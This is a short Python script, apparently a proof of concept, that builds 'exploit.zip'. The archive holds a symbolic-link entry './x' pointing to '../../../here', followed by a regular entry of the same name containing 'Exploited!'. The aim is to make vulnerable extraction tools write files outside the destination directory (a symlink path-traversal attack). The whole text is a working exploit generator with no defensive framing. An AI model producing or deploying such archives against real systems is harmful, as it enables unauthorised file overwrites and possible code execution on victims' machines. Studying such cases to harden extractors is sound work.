import zipfile
import os
import io

def create_zip(zip_path):
    with zipfile.ZipFile(zip_path, 'w') as zip_ref:
        symlink_target = '../../../here'
        symlink_info = zipfile.ZipInfo('./x')
        symlink_info.external_attr = 0o120777 << 16
        zip_ref.writestr(symlink_info, symlink_target)
        regular_file_content = b'Exploited!\n'
        zip_ref.writestr('./x', regular_file_content)

if __name__ == "__main__":
    zip_path = "exploit.zip"
    create_zip(zip_path)
    print(f"Zip file created at {zip_path} with the specific conditions.")
